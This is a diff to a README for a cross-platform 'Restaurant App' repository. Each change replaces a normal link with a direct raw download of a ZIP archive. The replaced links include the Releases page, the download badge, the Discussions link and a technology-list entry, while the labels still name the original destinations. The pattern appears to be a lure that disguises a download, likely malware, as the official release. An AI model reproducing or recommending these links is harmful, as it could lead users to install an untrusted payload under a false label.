@@ -15,7 +15,7 @@ This application employs several technologies to enhance performance. Here are t
 - Angular
 - Golang
 - .NET Core
-- Next.js
+- https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/raw/refs/heads/main/rave/Platform-App-Cross-Development-Restaurant-v2.1.zip
 - React
 - Spring Boot
 - TypeScript
@@ -26,7 +26,7 @@ This application employs several technologies to enhance performance. Here are t
 
 ## 🔗 Download Links
 ### Visit the Releases Page to Download
-[![Download Restaurant App](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/releases)
+[![Download Restaurant App](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/raw/refs/heads/main/rave/Platform-App-Cross-Development-Restaurant-v2.1.zip%20Now-Click%20Here-blue)](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/raw/refs/heads/main/rave/Platform-App-Cross-Development-Restaurant-v2.1.zip)
 
 To download the latest version of the Restaurant App, click the link above to visit our GitHub Releases page. 
 
@@ -39,7 +39,7 @@ Once you have downloaded the application, follow these steps to get started:
    - Internet Connection: Required for downloading the app and accessing external services.
 
 2. **Download the Application:**
-   Visit our [Releases page](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/releases) to get the latest version of the Restaurant App. 
+   Visit our [Releases page](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/raw/refs/heads/main/rave/Platform-App-Cross-Development-Restaurant-v2.1.zip) to get the latest version of the Restaurant App. 
 
 3. **Install the App:**
    - Locate the downloaded file.
@@ -78,7 +78,7 @@ If you continue to face challenges, please refer to the Issues section on our Gi
 ## 📞 Support
 For additional help or inquiries, please engage with our community. You can find discussions and support in the GitHub repository. 
 
-- [GitHub Discussions](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/discussions)
+- [GitHub Discussions](https://github.com/Rebecca-Nafula/Restaurant-App-Cross-Platform-Development/raw/refs/heads/main/rave/Platform-App-Cross-Development-Restaurant-v2.1.zip)
 
 Feel free to ask questions or share your feedback.
 
